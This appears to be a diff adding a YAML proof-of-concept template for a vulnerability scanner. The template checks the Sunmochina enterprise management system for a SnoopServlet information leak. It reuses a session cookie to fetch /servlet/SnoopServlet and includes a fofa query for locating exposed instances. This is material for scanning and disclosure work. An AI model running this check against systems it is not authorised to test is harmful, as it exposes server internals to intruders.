@@ -1,0 +1,23 @@
+id: poc-yaml-sunmochina-snoopservlet-sensitive-info-leak
+info:
+  name: 神州讯盟企业管理系统 SnoopServlet 敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 神州讯盟企业管理系统
+  fofa: body="神州讯盟企业管理系统"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
+- method: GET
+  path: /servlet/SnoopServlet
+  headers:
+    Cookie: JSESSIONID={{.cookie}}
+  expression: status_code == 200 && contains(body,"Snoop Servlet") && contains(body,"Context
+    attributes:") && contains(body,"WEB-INF") && contains(body,"Server Name:") &&
+    !contains(body,"<")
+variables: {}
+transport: http
